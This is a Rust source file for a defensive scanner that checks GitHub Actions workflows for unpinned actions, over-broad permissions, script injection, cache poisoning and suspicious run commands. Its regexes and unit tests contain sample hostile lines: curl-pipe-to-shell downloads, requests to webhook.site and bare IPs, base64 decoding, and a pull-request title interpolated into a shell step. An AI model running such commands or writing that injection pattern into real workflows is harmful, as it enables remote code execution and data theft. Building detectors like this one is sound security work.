//! `aegis actions scan` — inspect GitHub Actions workflows for risk.
//!
//! Ported from Go's `internal/infra/scan/actions/heuristics.go`.
//!
//! Note the verb collision this resolves: Go's `actions scan` inspects
//! workflows, while the Rust `actions` command *generates* one. Both now
//! exist — `actions` alone still prints a workflow, `actions scan` reads
//! them.
//!
//! Parsing is line-oriented rather than a real YAML load, matching how
//! `pnpm.rs` handles `pnpm-lock.yaml`. Every rule here keys on a `uses:`
//! ref, a `run:` body, or a `permissions:` value, none of which need a
//! full document model — and a workflow that is too malformed to parse
//! this way is also too malformed for Actions to run.

use std::path::{Path, PathBuf};
use std::process::ExitCode;
use std::sync::OnceLock;

use regex::Regex;
use serde::Serialize;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize)]
#[serde(rename_all = "lowercase")]
pub(crate) enum Sev {
    Medium,
    High,
    Critical,
}

impl Sev {
    fn name(self) -> &'static str {
        match self {
            Sev::Critical => "critical",
            Sev::High => "high",
            Sev::Medium => "medium",
        }
    }
}

#[derive(Debug, Clone, Serialize)]
pub(crate) struct Finding {
    pub severity: Sev,
    pub rule: &'static str,
    pub file: String,
    pub line: usize,
    pub message: String,
    #[serde(skip_serializing_if = "String::is_empty")]
    pub evidence: String,
}

macro_rules! re {
    ($name:ident, $pat:expr) => {
        fn $name() -> &'static Regex {
            static RE: OnceLock<Regex> = OnceLock::new();
            RE.get_or_init(|| Regex::new($pat).expect("literal regex compiles"))
        }
    };
}

re!(uses_line, r"^\s*-?\s*uses:\s*['\x22]?([^'\x22\s#]+)");
re!(run_line, r"^(\s*)-?\s*run:\s*(.*)$");
re!(perms_write_all, r"(?i)^\s*permissions:\s*write-all\s*$");
re!(sha_pin, r"^[0-9a-f]{40}$");

// A GitHub context a non-collaborator can set, interpolated into a shell
// body. This is command injection with extra steps.
re!(
    script_injection,
    r"\$\{\{\s*github\.event\.(pull_request\.(title|body|head\.ref|head\.label)|issue\.(title|body)|comment\.body|review\.body|head_commit\.message|discussion\.(title|body))"
);

/// Patterns applied to `run:` bodies. Ported verbatim from Go's
/// `suspiciousRunPatterns`.
fn suspicious_run() -> &'static [(&'static str, Sev, &'static str, Regex)] {
    static PATS: OnceLock<Vec<(&'static str, Sev, &'static str, Regex)>> = OnceLock::new();
    PATS.get_or_init(|| {
        vec![
            (
                "run-curl-pipe-sh",
                Sev::High,
                "curl|sh / wget|sh — downloads and executes a remote script with no integrity check",
                Regex::new(r"(?i)(curl|wget)\s+[^\n|]*\|\s*(sh|bash|zsh|ksh)\b").unwrap(),
            ),
            (
                "run-base64-decode",
                Sev::High,
                "base64 decode in a run script — common obfuscation primitive",
                Regex::new(r"(?i)\b(base64\s+(-d|--decode)|echo\s+[A-Za-z0-9+/=]{40,}\s*\|\s*base64)").unwrap(),
            ),
            (
                "run-decode-eval",
                Sev::High,
                "eval(atob(...)) / eval(Buffer.from(...)) — in-process decode-and-eval hides the payload from a static grep",
                Regex::new(r"(?i)\beval\s*\(\s*(atob\s*\(|Buffer\.from\s*\()").unwrap(),
            ),
            (
                "run-bare-ip",
                Sev::High,
                "raw IPv4 in a URL — legitimate scripts use hostnames",
                Regex::new(r"https?://\d+\.\d+\.\d+\.\d+(:\d+)?(/|$|\s)").unwrap(),
            ),
            (
                "run-exfil-host",
                Sev::High,
                "well-known data-exfiltration destination",
                Regex::new(r"(?i)\b(pastebin\.com|hastebin\.com|requestbin\.|webhook\.site|ngrok\.io|burpcollaborator\.net|oast\.\w+)\b").unwrap(),
            ),
        ]
    })
}

/// Scan one workflow file. Pure: takes the text, returns findings.
pub(crate) fn scan_workflow(file: &str, text: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    let lines: Vec<&str> = text.lines().collect();

    let has_pr_target = text.contains("pull_request_target");
    let mut uses_cache = false;

    let mut i = 0usize;
    while i < lines.len() {
        let line = lines[i];
        let lineno = i + 1;

        if perms_write_all().is_match(line) {
            out.push(Finding {
                severity: Sev::High,
                rule: "permissions-write-all",
                file: file.into(),
                line: lineno,
                message: "permissions: write-all — GITHUB_TOKEN gets every scope; narrow it to what the job needs".into(),
                evidence: line.trim().into(),
            });
        }

        if let Some(c) = uses_line().captures(line) {
            let r = &c[1];
            if r.starts_with("actions/cache") {
                uses_cache = true;
            }
            if let Some(f) = check_unpinned(file, lineno, r) {
                out.push(f);
            }
        }

        // A `run:` body is either inline or a block scalar continuing while
        // the indent stays deeper than the `run:` key itself.
        if let Some(c) = run_line().captures(line) {
            let indent = c[1].len();
            let mut body = c[2].to_string();
            let start = lineno;
            let mut j = i + 1;
            if body.trim() == "|" || body.trim() == ">" || body.trim().is_empty() {
                body.clear();
                while j < lines.len() {
                    let l = lines[j];
                    let deeper = l.trim().is_empty() || l.len() - l.trim_start().len() > indent;
                    if !deeper {
                        break;
                    }
                    body.push_str(l);
                    body.push('\n');
                    j += 1;
                }
            }
            out.extend(check_run(file, start, &body));
            i = j.max(i + 1);
            continue;
        }
        i += 1;
    }

    if has_pr_target && uses_cache {
        out.push(Finding {
            severity: Sev::High,
            rule: "cache-poisoning",
            file: file.into(),
            line: 1,
            message: "pull_request_target with actions/cache — a fork PR shares the base branch cache and can poison it".into(),
            evidence: String::new(),
        });
    }
    out
}

fn check_unpinned(file: &str, line: usize, r: &str) -> Option<Finding> {
    // Local (`./path`) and container (`docker://`) refs have no tag to
    // retarget, so they are not in scope.
    if r.starts_with('.') || r.starts_with("docker://") {
        return None;
    }
    let (path, git_ref) = r.split_once('@')?;
    if sha_pin().is_match(git_ref) {
        return None;
    }
    let owner = path.split('/').next().unwrap_or("");
    // GitHub-owned actions are conventionally tag-pinned and are a much
    // smaller target than a third-party action owned by one maintainer.
    let severity = if owner == "actions" || owner == "github" {
        Sev::Medium
    } else {
        Sev::High
    };
    Some(Finding {
        severity,
        rule: "unpinned-action-ref",
        file: file.into(),
        line,
        message: format!(
            "uses: {r} — not pinned to a commit SHA; the tag or branch can be retargeted by the action owner"
        ),
        evidence: String::new(),
    })
}

fn check_run(file: &str, start: usize, body: &str) -> Vec<Finding> {
    let mut out = Vec::new();
    if let Some(m) = script_injection().find(body) {
        out.push(Finding {
            severity: Sev::Critical,
            rule: "script-injection",
            file: file.into(),
            line: start + body[..m.start()].matches('\n').count(),
            message: "attacker-controlled GitHub context interpolated into a run script — treat it as command injection".into(),
            evidence: trunc(m.as_str()),
        });
    }
    for (rule, sev, hint, re) in suspicious_run() {
        if let Some(m) = re.find(body) {
            out.push(Finding {
                severity: *sev,
                rule,
                file: file.into(),
                line: start + body[..m.start()].matches('\n').count(),
                message: (*hint).into(),
                evidence: trunc(m.as_str()),
            });
        }
    }
    out
}

fn trunc(s: &str) -> String {
    let s = s.trim();
    if s.chars().count() <= 120 {
        s.to_string()
    } else {
        s.chars().take(119).collect::<String>() + "…"
    }
}

// --- CLI ---

fn workflow_files(dir: &Path) -> Vec<PathBuf> {
    let mut out = Vec::new();
    if let Ok(rd) = std::fs::read_dir(dir) {
        for e in rd.flatten() {
            let p = e.path();
            let ext = p.extension().and_then(|s| s.to_str()).unwrap_or("");
            if p.is_file() && (ext == "yml" || ext == "yaml") {
                out.push(p);
            }
        }
    }
    out.sort();
    out
}

pub(crate) fn run_actions_scan(dir: Option<&str>, fail_on: &str, json: bool) -> ExitCode {
    let root = dir
        .map(PathBuf::from)
        .unwrap_or_else(|| PathBuf::from(".github/workflows"));
    let threshold = match fail_on {
        "critical" => Sev::Critical,
        "high" => Sev::High,
        "medium" => Sev::Medium,
        other => {
            eprintln!("aegis: invalid --fail-on {other:?} (critical|high|medium)");
            return ExitCode::from(2);
        }
    };

    let files = workflow_files(&root);
    if files.is_empty() {
        eprintln!("aegis: no workflow files in {}", root.display());
        return ExitCode::from(2);
    }

    let mut findings = Vec::new();
    for f in &files {
        let Ok(text) = std::fs::read_to_string(f) else {
            eprintln!("aegis: cannot read {}", f.display());
            continue;
        };
        findings.extend(scan_workflow(&f.display().to_string(), &text));
    }
    findings.sort_by(|a, b| b.severity.cmp(&a.severity).then(a.file.cmp(&b.file)));

    if json {
        match serde_json::to_string_pretty(&findings) {
            Ok(s) => println!("{s}"),
            Err(e) => {
                eprintln!("aegis: json encode failed: {e}");
                return ExitCode::from(2);
            }
        }
    } else if findings.is_empty() {
        println!("scanned {} workflow(s) — no findings", files.len());
    } else {
        for f in &findings {
            println!("{}:{} [{}] {}", f.file, f.line, f.severity.name(), f.rule);
            println!("    {}", f.message);
            if !f.evidence.is_empty() {
                println!("    {}", f.evidence);
            }
        }
        println!(
            "{} finding(s) across {} workflow(s)",
            findings.len(),
            files.len()
        );
    }

    if findings.iter().any(|f| f.severity >= threshold) {
        ExitCode::from(1)
    } else {
        ExitCode::SUCCESS
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(fs: &[Finding]) -> Vec<&str> {
        fs.iter().map(|f| f.rule).collect()
    }

    #[test]
    fn sha_pinned_action_is_clean() {
        let wf = "jobs:\n  b:\n    steps:\n      - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n";
        assert!(scan_workflow("w.yml", wf).is_empty());
    }

    #[test]
    fn tag_pinned_third_party_is_high_but_github_owned_is_medium() {
        let third = scan_workflow("w.yml", "      - uses: tj-actions/changed-files@v44\n");
        assert_eq!(third[0].severity, Sev::High);

        let owned = scan_workflow("w.yml", "      - uses: actions/checkout@v4\n");
        assert_eq!(owned[0].severity, Sev::Medium);
    }

    #[test]
    fn local_and_docker_refs_are_not_flagged() {
        for r in ["./.github/actions/local", "docker://alpine:3"] {
            let wf = format!("      - uses: {r}\n");
            assert!(scan_workflow("w.yml", &wf).is_empty(), "flagged {r}");
        }
    }

    #[test]
    fn script_injection_is_critical() {
        let wf = "      - run: echo \"${{ github.event.pull_request.title }}\"\n";
        let f = scan_workflow("w.yml", wf);
        assert!(rules(&f).contains(&"script-injection"));
        assert_eq!(f[0].severity, Sev::Critical);
    }

    #[test]
    fn a_safe_context_interpolation_is_not_injection() {
        // github.sha and friends are not attacker-controlled.
        let wf = "      - run: echo \"${{ github.sha }}\"\n";
        assert!(!rules(&scan_workflow("w.yml", wf)).contains(&"script-injection"));
    }

    #[test]
    fn suspicious_run_patterns_fire_in_block_scalars() {
        let wf =
            "      - run: |\n          echo start\n          curl -sSL https://x.test/p | sh\n";
        let f = scan_workflow("w.yml", wf);
        assert!(rules(&f).contains(&"run-curl-pipe-sh"), "{f:#?}");
    }

    #[test]
    fn write_all_permissions_flagged() {
        let f = scan_workflow("w.yml", "permissions: write-all\n");
        assert!(rules(&f).contains(&"permissions-write-all"));
    }

    #[test]
    fn scoped_permissions_are_clean() {
        let wf = "permissions:\n  contents: read\n";
        assert!(scan_workflow("w.yml", wf).is_empty());
    }

    #[test]
    fn cache_poisoning_needs_both_halves() {
        let both =
            "on: pull_request_target\njobs:\n  b:\n    steps:\n      - uses: actions/cache@v4\n";
        assert!(rules(&scan_workflow("w.yml", both)).contains(&"cache-poisoning"));

        let cache_only = "on: push\njobs:\n  b:\n    steps:\n      - uses: actions/cache@v4\n";
        assert!(!rules(&scan_workflow("w.yml", cache_only)).contains(&"cache-poisoning"));
    }

    #[test]
    fn exfil_hosts_and_bare_ips() {
        for (body, want) in [
            (
                "      - run: curl https://webhook.site/abc\n",
                "run-exfil-host",
            ),
            ("      - run: curl http://203.0.113.7/x\n", "run-bare-ip"),
            ("      - run: echo Zm9v | base64 -d\n", "run-base64-decode"),
        ] {
            assert!(
                rules(&scan_workflow("w.yml", body)).contains(&want),
                "missed {want}"
            );
        }
    }

    #[test]
    fn line_numbers_point_into_the_block() {
        let wf = "jobs:\n  b:\n    steps:\n      - run: |\n          ok\n          curl http://198.51.100.9/x\n";
        let f = scan_workflow("w.yml", wf);
        let hit = f.iter().find(|f| f.rule == "run-bare-ip").expect("found");
        assert!(
            hit.line >= 5,
            "line {} should be inside the block",
            hit.line
        );
    }

    #[test]
    fn every_pattern_compiles() {
        // These live behind expect(); the regex crate has no look-around,
        // which is easy to reach for by habit.
        let _ = (
            uses_line(),
            run_line(),
            perms_write_all(),
            sha_pin(),
            script_injection(),
            suspicious_run().len(),
        );
    }
}
